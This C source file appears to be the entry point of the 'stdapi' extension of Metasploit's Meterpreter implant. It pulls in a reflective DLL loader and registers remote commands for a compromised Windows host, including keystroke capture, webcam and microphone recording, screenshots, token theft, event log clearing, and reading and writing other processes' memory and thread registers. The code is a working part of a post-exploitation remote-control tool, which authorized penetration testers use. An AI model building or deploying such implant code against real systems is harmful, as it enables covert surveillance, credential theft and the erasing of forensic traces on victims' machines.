/*
 * This module provides access to the standard API of the machine in some
 * regards
 */
#include "precomp.h"

// include the Reflectiveloader() function, we end up linking back to the metsrv.dll's Init function
// but this doesnt matter as we wont ever call DLL_METASPLOIT_ATTACH as that is only used by the
// second stage reflective dll inject payload and not the metsrv itself when it loads extensions.
#include "../../../ReflectiveDLLInjection/dll/src/ReflectiveLoader.c"

// NOTE: _CRT_SECURE_NO_WARNINGS has been added to Configuration->C/C++->Preprocessor->Preprocessor

// this sets the delay load hook function, see DelayLoadMetSrv.h
EnableDelayLoadMetSrv();

#define CORE_CHANNEL_OPEN 1003
#define STDAPI_FS_CHDIR 2003
#define STDAPI_FS_DELETE_DIR 2005
#define STDAPI_FS_DELETE_FILE 2006
#define STDAPI_FS_FILE_COPY 2007
#define STDAPI_FS_FILE_EXPAND_PATH 2008
#define STDAPI_FS_FILE_MOVE 2009
#define STDAPI_FS_GETWD 2010
#define STDAPI_FS_LS 2011
#define STDAPI_FS_MD5 2012
#define STDAPI_FS_MKDIR 2013
#define STDAPI_FS_MOUNT_SHOW 2014
#define STDAPI_FS_SEARCH 2015
#define STDAPI_FS_SEPARATOR 2016
#define STDAPI_FS_SHA1 2017
#define STDAPI_FS_STAT 2018
#define STDAPI_NET_CONFIG_ADD_ROUTE 2019
#define STDAPI_NET_CONFIG_GET_ARP_TABLE 2020
#define STDAPI_NET_CONFIG_GET_INTERFACES 2021
#define STDAPI_NET_CONFIG_GET_NETSTAT 2022
#define STDAPI_NET_CONFIG_GET_PROXY 2023
#define STDAPI_NET_CONFIG_GET_ROUTES 2024
#define STDAPI_NET_CONFIG_REMOVE_ROUTE 2025
#define STDAPI_NET_RESOLVE_HOST 2026
#define STDAPI_NET_RESOLVE_HOSTS 2027
#define STDAPI_NET_SOCKET_TCP_SHUTDOWN 2028
#define STDAPI_RAILGUN_API 2029
#define STDAPI_RAILGUN_API_MULTI 2030
#define STDAPI_RAILGUN_MEMREAD 2031
#define STDAPI_RAILGUN_MEMWRITE 2032
#define STDAPI_REGISTRY_CHECK_KEY_EXISTS 2033
#define STDAPI_REGISTRY_CLOSE_KEY 2034
#define STDAPI_REGISTRY_CREATE_KEY 2035
#define STDAPI_REGISTRY_DELETE_KEY 2036
#define STDAPI_REGISTRY_DELETE_VALUE 2037
#define STDAPI_REGISTRY_ENUM_KEY 2038
#define STDAPI_REGISTRY_ENUM_KEY_DIRECT 2039
#define STDAPI_REGISTRY_ENUM_VALUE 2040
#define STDAPI_REGISTRY_ENUM_VALUE_DIRECT 2041
#define STDAPI_REGISTRY_LOAD_KEY 2042
#define STDAPI_REGISTRY_OPEN_KEY 2043
#define STDAPI_REGISTRY_OPEN_REMOTE_KEY 2044
#define STDAPI_REGISTRY_QUERY_CLASS 2045
#define STDAPI_REGISTRY_QUERY_VALUE 2046
#define STDAPI_REGISTRY_QUERY_VALUE_DIRECT 2047
#define STDAPI_REGISTRY_SET_VALUE 2048
#define STDAPI_REGISTRY_SET_VALUE_DIRECT 2049
#define STDAPI_REGISTRY_UNLOAD_KEY 2050
#define STDAPI_SYS_CONFIG_DRIVER_LIST 2051
#define STDAPI_SYS_CONFIG_DROP_TOKEN 2052
#define STDAPI_SYS_CONFIG_GETENV 2053
#define STDAPI_SYS_CONFIG_GETPRIVS 2054
#define STDAPI_SYS_CONFIG_GETSID 2055
#define STDAPI_SYS_CONFIG_GETUID 2056
#define STDAPI_SYS_CONFIG_LOCALTIME 2057
#define STDAPI_SYS_CONFIG_REV2SELF 2058
#define STDAPI_SYS_CONFIG_STEAL_TOKEN 2059
#define STDAPI_SYS_CONFIG_SYSINFO 2060
#define STDAPI_SYS_EVENTLOG_CLEAR 2061
#define STDAPI_SYS_EVENTLOG_CLOSE 2062
#define STDAPI_SYS_EVENTLOG_NUMRECORDS 2063
#define STDAPI_SYS_EVENTLOG_OLDEST 2064
#define STDAPI_SYS_EVENTLOG_OPEN 2065
#define STDAPI_SYS_EVENTLOG_READ 2066
#define STDAPI_SYS_POWER_EXITWINDOWS 2067
#define STDAPI_SYS_PROCESS_ATTACH 2068
#define STDAPI_SYS_PROCESS_CLOSE 2069
#define STDAPI_SYS_PROCESS_EXECUTE 2070
#define STDAPI_SYS_PROCESS_GET_INFO 2071
#define STDAPI_SYS_PROCESS_GET_PROCESSES 2072
#define STDAPI_SYS_PROCESS_GETPID 2073
#define STDAPI_SYS_PROCESS_IMAGE_GET_IMAGES 2074
#define STDAPI_SYS_PROCESS_IMAGE_GET_PROC_ADDRESS 2075
#define STDAPI_SYS_PROCESS_IMAGE_LOAD 2076
#define STDAPI_SYS_PROCESS_IMAGE_UNLOAD 2077
#define STDAPI_SYS_PROCESS_KILL 2078
#define STDAPI_SYS_PROCESS_MEMORY_ALLOCATE 2079
#define STDAPI_SYS_PROCESS_MEMORY_FREE 2080
#define STDAPI_SYS_PROCESS_MEMORY_LOCK 2081
#define STDAPI_SYS_PROCESS_MEMORY_PROTECT 2082
#define STDAPI_SYS_PROCESS_MEMORY_QUERY 2083
#define STDAPI_SYS_PROCESS_MEMORY_READ 2084
#define STDAPI_SYS_PROCESS_MEMORY_UNLOCK 2085
#define STDAPI_SYS_PROCESS_MEMORY_WRITE 2086
#define STDAPI_SYS_PROCESS_THREAD_CLOSE 2087
#define STDAPI_SYS_PROCESS_THREAD_CREATE 2088
#define STDAPI_SYS_PROCESS_THREAD_GET_THREADS 2089
#define STDAPI_SYS_PROCESS_THREAD_OPEN 2090
#define STDAPI_SYS_PROCESS_THREAD_QUERY_REGS 2091
#define STDAPI_SYS_PROCESS_THREAD_RESUME 2092
#define STDAPI_SYS_PROCESS_THREAD_SET_REGS 2093
#define STDAPI_SYS_PROCESS_THREAD_SUSPEND 2094
#define STDAPI_SYS_PROCESS_THREAD_TERMINATE 2095
#define STDAPI_SYS_PROCESS_WAIT 2096
#define STDAPI_UI_DESKTOP_ENUM 2097
#define STDAPI_UI_DESKTOP_GET 2098
#define STDAPI_UI_DESKTOP_SCREENSHOT 2099
#define STDAPI_UI_DESKTOP_SET 2100
#define STDAPI_UI_ENABLE_KEYBOARD 2101
#define STDAPI_UI_ENABLE_MOUSE 2102
#define STDAPI_UI_GET_IDLE_TIME 2103
#define STDAPI_UI_GET_KEYS 2104
#define STDAPI_UI_GET_KEYS_UTF8 2105
#define STDAPI_UI_SEND_KEYS 2106
#define STDAPI_UI_SEND_MOUSE 2107
#define STDAPI_UI_START_KEYSCAN 2108
#define STDAPI_UI_STOP_KEYSCAN 2109
#define STDAPI_WEBCAM_AUDIO_RECORD 2111
#define STDAPI_WEBCAM_GET_FRAME 2112
#define STDAPI_WEBCAM_LIST 2113
#define STDAPI_WEBCAM_START 2114
#define STDAPI_WEBCAM_STOP 2115


// General
extern DWORD request_general_channel_open(Remote *remote, Packet *packet);

Command customCommands[] =
{
	// General
	COMMAND_REQ(CORE_CHANNEL_OPEN, request_general_channel_open),

	// Railgun
	COMMAND_REQ(STDAPI_RAILGUN_API, request_railgun_api),
	COMMAND_REQ(STDAPI_RAILGUN_API_MULTI, request_railgun_api_multi),
	COMMAND_REQ(STDAPI_RAILGUN_MEMREAD, request_railgun_memread),
	COMMAND_REQ(STDAPI_RAILGUN_MEMWRITE, request_railgun_memwrite),

	// Fs
	COMMAND_REQ(STDAPI_FS_LS, request_fs_ls),
	COMMAND_REQ(STDAPI_FS_GETWD, request_fs_getwd),
	COMMAND_REQ(STDAPI_FS_CHDIR, request_fs_chdir),
	COMMAND_REQ(STDAPI_FS_MKDIR, request_fs_mkdir),
	COMMAND_REQ(STDAPI_FS_DELETE_DIR, request_fs_delete_dir),
	COMMAND_REQ(STDAPI_FS_DELETE_FILE, request_fs_delete_file),
	COMMAND_REQ(STDAPI_FS_SEPARATOR, request_fs_separator),
	COMMAND_REQ(STDAPI_FS_STAT, request_fs_stat),
	COMMAND_REQ(STDAPI_FS_FILE_EXPAND_PATH, request_fs_file_expand_path),
	COMMAND_REQ(STDAPI_FS_FILE_MOVE, request_fs_file_move),
	COMMAND_REQ(STDAPI_FS_FILE_COPY, request_fs_file_copy),
	COMMAND_REQ(STDAPI_FS_MD5, request_fs_md5),
	COMMAND_REQ(STDAPI_FS_SHA1, request_fs_sha1),
	COMMAND_REQ(STDAPI_FS_SEARCH, request_fs_search),
	COMMAND_REQ(STDAPI_FS_MOUNT_SHOW, request_fs_mount_show),

	// Process
	COMMAND_REQ(STDAPI_SYS_PROCESS_ATTACH, request_sys_process_attach),
	COMMAND_REQ(STDAPI_SYS_PROCESS_CLOSE, request_sys_process_close),
	COMMAND_REQ(STDAPI_SYS_PROCESS_EXECUTE, request_sys_process_execute),
	COMMAND_REQ(STDAPI_SYS_PROCESS_KILL, request_sys_process_kill),
	COMMAND_REQ(STDAPI_SYS_PROCESS_GET_PROCESSES, request_sys_process_get_processes),
	COMMAND_REQ(STDAPI_SYS_PROCESS_GETPID, request_sys_process_getpid),
	COMMAND_REQ(STDAPI_SYS_PROCESS_GET_INFO, request_sys_process_get_info),
	COMMAND_REQ(STDAPI_SYS_PROCESS_WAIT, request_sys_process_wait),

	// Image
	COMMAND_REQ(STDAPI_SYS_PROCESS_IMAGE_LOAD, request_sys_process_image_load),
	COMMAND_REQ(STDAPI_SYS_PROCESS_IMAGE_GET_PROC_ADDRESS, request_sys_process_image_get_proc_address),
	COMMAND_REQ(STDAPI_SYS_PROCESS_IMAGE_UNLOAD, request_sys_process_image_unload),
	COMMAND_REQ(STDAPI_SYS_PROCESS_IMAGE_GET_IMAGES, request_sys_process_image_get_images),

	// Memory
	COMMAND_REQ(STDAPI_SYS_PROCESS_MEMORY_ALLOCATE, request_sys_process_memory_allocate),
	COMMAND_REQ(STDAPI_SYS_PROCESS_MEMORY_FREE, request_sys_process_memory_free),
	COMMAND_REQ(STDAPI_SYS_PROCESS_MEMORY_READ, request_sys_process_memory_read),
	COMMAND_REQ(STDAPI_SYS_PROCESS_MEMORY_WRITE, request_sys_process_memory_write),
	COMMAND_REQ(STDAPI_SYS_PROCESS_MEMORY_QUERY, request_sys_process_memory_query),
	COMMAND_REQ(STDAPI_SYS_PROCESS_MEMORY_PROTECT, request_sys_process_memory_protect),
	COMMAND_REQ(STDAPI_SYS_PROCESS_MEMORY_LOCK, request_sys_process_memory_lock),
	COMMAND_REQ(STDAPI_SYS_PROCESS_MEMORY_UNLOCK, request_sys_process_memory_unlock),

	// Thread
	COMMAND_REQ(STDAPI_SYS_PROCESS_THREAD_OPEN, request_sys_process_thread_open),
	COMMAND_REQ(STDAPI_SYS_PROCESS_THREAD_CREATE, request_sys_process_thread_create),
	COMMAND_REQ(STDAPI_SYS_PROCESS_THREAD_CLOSE, request_sys_process_thread_close),
	COMMAND_REQ(STDAPI_SYS_PROCESS_THREAD_GET_THREADS, request_sys_process_thread_get_threads),
	COMMAND_REQ(STDAPI_SYS_PROCESS_THREAD_SUSPEND, request_sys_process_thread_suspend),
	COMMAND_REQ(STDAPI_SYS_PROCESS_THREAD_RESUME, request_sys_process_thread_resume),
	COMMAND_REQ(STDAPI_SYS_PROCESS_THREAD_TERMINATE, request_sys_process_thread_terminate),
	COMMAND_REQ(STDAPI_SYS_PROCESS_THREAD_QUERY_REGS, request_sys_process_thread_query_regs),
	COMMAND_REQ(STDAPI_SYS_PROCESS_THREAD_SET_REGS, request_sys_process_thread_set_regs),

	// Registry
	COMMAND_REQ(STDAPI_REGISTRY_CHECK_KEY_EXISTS, request_registry_check_key_exists),
	COMMAND_REQ(STDAPI_REGISTRY_LOAD_KEY, request_registry_load_key),
	COMMAND_REQ(STDAPI_REGISTRY_UNLOAD_KEY, request_registry_unload_key),
	COMMAND_REQ(STDAPI_REGISTRY_OPEN_KEY, request_registry_open_key),
	COMMAND_REQ(STDAPI_REGISTRY_OPEN_REMOTE_KEY, request_registry_open_remote_key),
	COMMAND_REQ(STDAPI_REGISTRY_CREATE_KEY, request_registry_create_key),
	COMMAND_REQ(STDAPI_REGISTRY_ENUM_KEY, request_registry_enum_key),
	COMMAND_REQ(STDAPI_REGISTRY_DELETE_KEY, request_registry_delete_key),
	COMMAND_REQ(STDAPI_REGISTRY_CLOSE_KEY, request_registry_close_key),
	COMMAND_REQ(STDAPI_REGISTRY_SET_VALUE, request_registry_set_value),
	COMMAND_REQ(STDAPI_REGISTRY_QUERY_VALUE, request_registry_query_value),
	COMMAND_REQ(STDAPI_REGISTRY_QUERY_CLASS, request_registry_query_class),
	COMMAND_REQ(STDAPI_REGISTRY_ENUM_VALUE, request_registry_enum_value),
	COMMAND_REQ(STDAPI_REGISTRY_DELETE_VALUE, request_registry_delete_value),
	COMMAND_REQ(STDAPI_REGISTRY_ENUM_KEY_DIRECT, request_registry_enum_key_direct),
	COMMAND_REQ(STDAPI_REGISTRY_ENUM_VALUE_DIRECT, request_registry_enum_value_direct),
	COMMAND_REQ(STDAPI_REGISTRY_QUERY_VALUE_DIRECT, request_registry_query_value_direct),
	COMMAND_REQ(STDAPI_REGISTRY_SET_VALUE_DIRECT, request_registry_set_value_direct),

	// Sys/config
	COMMAND_REQ(STDAPI_SYS_CONFIG_GETUID, request_sys_config_getuid),
	COMMAND_REQ(STDAPI_SYS_CONFIG_LOCALTIME, request_sys_config_localtime),
	COMMAND_REQ(STDAPI_SYS_CONFIG_SYSINFO, request_sys_config_sysinfo),
	COMMAND_REQ(STDAPI_SYS_CONFIG_REV2SELF, request_sys_config_rev2self),
	COMMAND_REQ(STDAPI_SYS_CONFIG_GETPRIVS, request_sys_config_getprivs),
	COMMAND_REQ(STDAPI_SYS_CONFIG_GETENV, request_sys_config_getenv),
	COMMAND_REQ(STDAPI_SYS_CONFIG_DRIVER_LIST, request_sys_config_driver_list),
	COMMAND_REQ(STDAPI_SYS_CONFIG_STEAL_TOKEN, request_sys_config_steal_token),
	COMMAND_REQ(STDAPI_SYS_CONFIG_DROP_TOKEN, request_sys_config_drop_token),
	COMMAND_REQ(STDAPI_SYS_CONFIG_GETSID, request_sys_config_getsid),

	// Net
	COMMAND_REQ(STDAPI_NET_CONFIG_GET_ROUTES, request_net_config_get_routes),
	COMMAND_REQ(STDAPI_NET_CONFIG_ADD_ROUTE, request_net_config_add_route),
	COMMAND_REQ(STDAPI_NET_CONFIG_REMOVE_ROUTE, request_net_config_remove_route),
	COMMAND_REQ(STDAPI_NET_CONFIG_GET_INTERFACES, request_net_config_get_interfaces),
	COMMAND_REQ(STDAPI_NET_CONFIG_GET_ARP_TABLE, request_net_config_get_arp_table),
	COMMAND_REQ(STDAPI_NET_CONFIG_GET_NETSTAT, request_net_config_get_netstat),

	// Proxy
	COMMAND_REQ(STDAPI_NET_CONFIG_GET_PROXY, request_net_config_get_proxy_config),
	// Resolve
	COMMAND_REQ(STDAPI_NET_RESOLVE_HOST, request_resolve_host),
	COMMAND_REQ(STDAPI_NET_RESOLVE_HOSTS, request_resolve_hosts),

	// Socket
	COMMAND_REQ(STDAPI_NET_SOCKET_TCP_SHUTDOWN, request_net_socket_tcp_shutdown),

	// UI
	COMMAND_REQ(STDAPI_UI_ENABLE_MOUSE, request_ui_enable_mouse),
	COMMAND_REQ(STDAPI_UI_ENABLE_KEYBOARD, request_ui_enable_keyboard),
	COMMAND_REQ(STDAPI_UI_GET_IDLE_TIME, request_ui_get_idle_time),
	COMMAND_REQ(STDAPI_UI_START_KEYSCAN, request_ui_start_keyscan),
	COMMAND_REQ(STDAPI_UI_STOP_KEYSCAN, request_ui_stop_keyscan),
	COMMAND_REQ(STDAPI_UI_GET_KEYS, request_ui_get_keys),
	COMMAND_REQ(STDAPI_UI_GET_KEYS_UTF8, request_ui_get_keys_utf8),
	COMMAND_REQ(STDAPI_UI_DESKTOP_ENUM, request_ui_desktop_enum),
	COMMAND_REQ(STDAPI_UI_DESKTOP_GET, request_ui_desktop_get),
	COMMAND_REQ(STDAPI_UI_DESKTOP_SET, request_ui_desktop_set),
	COMMAND_REQ(STDAPI_UI_DESKTOP_SCREENSHOT, request_ui_desktop_screenshot),
	COMMAND_REQ(STDAPI_UI_SEND_KEYS, request_ui_send_keys),
	COMMAND_REQ(STDAPI_UI_SEND_MOUSE, request_ui_send_mouse),

	// Event Log
	COMMAND_REQ(STDAPI_SYS_EVENTLOG_OPEN, request_sys_eventlog_open),
	COMMAND_REQ(STDAPI_SYS_EVENTLOG_NUMRECORDS, request_sys_eventlog_numrecords),
	COMMAND_REQ(STDAPI_SYS_EVENTLOG_READ, request_sys_eventlog_read),
	COMMAND_REQ(STDAPI_SYS_EVENTLOG_OLDEST, request_sys_eventlog_oldest),
	COMMAND_REQ(STDAPI_SYS_EVENTLOG_CLEAR, request_sys_eventlog_clear),
	COMMAND_REQ(STDAPI_SYS_EVENTLOG_CLOSE, request_sys_eventlog_close),

	// Power
	COMMAND_REQ(STDAPI_SYS_POWER_EXITWINDOWS, request_sys_power_exitwindows),

	// Webcam
	COMMAND_REQ(STDAPI_WEBCAM_LIST, request_webcam_list),
	COMMAND_REQ(STDAPI_WEBCAM_START, request_webcam_start),
	COMMAND_REQ(STDAPI_WEBCAM_GET_FRAME, request_webcam_get_frame),
	COMMAND_REQ(STDAPI_WEBCAM_STOP, request_webcam_stop),

	// Audio
	COMMAND_REQ(STDAPI_WEBCAM_AUDIO_RECORD, request_ui_record_mic),

	COMMAND_TERMINATOR
};

/*!
 * @brief Initialize the server extension.
 * @param remote Pointer to the remote instance.
 * @return Indication of success or failure.
 */
DWORD __declspec(dllexport) InitServerExtension(Remote *remote)
{
	hMetSrv = remote->met_srv;

	command_register_all(customCommands);

	return ERROR_SUCCESS;
}

/*!
 * @brief Deinitialize the server extension.
 * @param remote Pointer to the remote instance.
 * @return Indication of success or failure.
 */
DWORD __declspec(dllexport) DeinitServerExtension(Remote *remote)
{
	command_deregister_all(customCommands);

	return ERROR_SUCCESS;
}

/*!
 * @brief Get the name of the extension.
 * @param buffer Pointer to the buffer to write the name to.
 * @param bufferSize Size of the \c buffer parameter.
 * @return Indication of success or failure.
 */
DWORD __declspec(dllexport) GetExtensionName(char* buffer, int bufferSize)
{
	strncpy_s(buffer, bufferSize, "stdapi", bufferSize - 1);
	return ERROR_SUCCESS;
}
